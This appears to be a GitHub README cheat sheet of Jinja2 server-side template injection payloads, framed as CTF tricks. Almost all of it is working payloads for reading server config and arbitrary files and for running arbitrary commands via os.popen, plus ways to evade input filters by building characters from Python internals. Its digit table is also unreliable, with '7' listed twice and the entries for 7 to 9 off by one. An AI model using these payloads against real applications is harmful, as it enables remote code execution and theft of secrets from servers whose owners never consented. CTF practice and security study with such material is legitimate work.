# Tricks in web exploit
[![Open Source Love](https://firstcontributions.github.io/open-source-badges/badges/open-source-v1/open-source.svg)](https://github.com/firstcontributions/open-source-badges)
[![License](https://camo.githubusercontent.com/fd551ba4b042d89480347a0e74e31af63b356b2cac1116c7b80038f41b04a581/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d4d49542d677265656e2e737667)](https://opensource.org/licenses/MIT)

This repository aims to simplify and help to make payload for web exploiting easier, most situations are based on CTFs. If you are looking for some tricky methods, hope you enjoy !!

---
## Table of contents
- [Technique](#Technique)
- [Snipets](#Snipets)
- [Cheat Sheet](#Cheat-sheet)
  - [SSTI](#SSTI)
    - [Jinja2](#Jinja2)
- [URL](#URL)
---
### SSTI
## What is ssti?
It means server-side template injection, occurs when an attacker is able to use native template syntax to inject a malicious payload into a template. Find more [here](https://portswigger.net/web-security/server-side-template-injection)

---
## Jinja2
It is template engine of flask framework, you can find more [here](https://flask.palletsprojects.com/en/2.1.x/templating/)

Some popular payload:
- Test ssti is working or not:`{{7*7}}` or `{{7*'7'}}` 
- Read config file of server`{{config.items()}}` or `{{config}}` or {% print config %}
- Open file at path `<path/of/file>`:
  - `{{ ''.__class__.__mro__[2].__subclasses__()[40]('<path/of/file>').read() }}`
  - `{{get_flashed_messages.__globals__.__builtins__.open("<path/of/file>").read()}}` 
  - `{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("<path/of/file>").read() }}`
- Open file flag (using filter pass below):
  - `{{lipsum.__globals__.__getitem__(dict(os=x)|first).popen((dict(cat=x)|first)+(dict(fl=x)|first|indent((dict(bla=x)|first)|length,true))+(dict(ag=x)|first)).read()}}`
  - `{{lipsum.__globals__[dict(__buil=anh,tins__=to)|join][dict(op=pro,en=wa)|join](dict(fl=a,ag=b)|join).read()}}`
  - `{{url_for.__globals__.os.popen((((dict(c=x,a=x,t=x)|list)|join)|center)+(dict(fl=x,ag=x)|list)|join).read()}}`
  - `{{get_flashed_messages.__globals__.__builtins__.open([].__doc__[-[[],[],[],[],[]].__len__()]+().__doc__[[[],[],[]].__len__()]+().__add__.__name__[[[],[]].__len__()]+().__gt__.__name__[[[],[]].__len__()]).read()}}`
- Execute `<cmd>`:
  - `{{lipsum.__globals__.os.popen('<cmd>').read()}}`
  - `{{cycler.__init__.__globals__.os.popen('<cmd>').read()}}`
  - `{{joiner.__init__.__globals__.os.popen('<cmd>').read()}}`
  - `{{namespace.__init__.__globals__.os.popen('<cmd>').read()}}`
  - `{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('<cmd>').read()}}`
  - `{{self._TemplateReference__context.joiner.__init__.__globals__.os.popen('<cmd>').read()}}`
  - `{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen('<cmd>').read()}}`
- Update config:
  - `{% set x=config.update(l=lipsum) %}`


Some popular filter:
- `{{ }}`: or some similar synstax (open synstax), you can use other methods such as `{% %}`
- `[a-Z]`: include some specific letter like: `flag`, `cat`, etc. You can change with magic python mechanism. 
  - `a`: `().__add__.__name__[2]` or `().__add__.__name__[-5]`
  - `d`: `().__add__.__name__[-3]`
  - `f`: `[].__doc__[-5]`
  - `g`: `().__gt__.__name__[2]` or `().__gt__.__name__[-4]
`
  - `l`: `().__doc__[3]` or `().__add__.__name__[3]`
  - `i`: `().__doc__[2]`
  - `j`: `().__doc__[5]`
  - `t`: `().__gt__.__name__[3]` or `().__gt__.__name__[-3]`
  - `u`: `().__doc__[1]`
  - `os`: `dict(os=x)|first`

- `[0-9]`: include decimal numbers, if you face with problems having above filter, free for combining them.
  - `0`: `[].__len__()`
  - `1`: `[[]].__len__()`
  - `2`: `[[],[]].__len__()`
  - `3`: `[[],[],[]].__len__()`
  - `4`: `[[],[],[],[]].__len__()`
  - `5`: `[[],[],[],[],[]].__len__()`
  - `6`: `[[],[],[],[],[],[]].__len__()`
  - `7`: `[[],[],[],[],[],[],[]].__len__()`
  - `7`: `[[],[],[],[],[],[],[],[]].__len__()`
  - `8`: `[[],[],[],[],[],[],[],[],[]].__len__()`
  - `9`: `[[],[],[],[],[],[],[],[],[],[]].__len__()`
- `'`: use `dict()` instead   
- ` `: blank or space, use `indent()`
- `_`: there are 2 methods:
  - Using hex encoder: %5F
  - Moving string over `request.args`: `{% set x = config.update(g=request.args.a) %}`, then `payload=<payload>&a=__globals__`

###### tags: `CTFs` `Web Exploit`
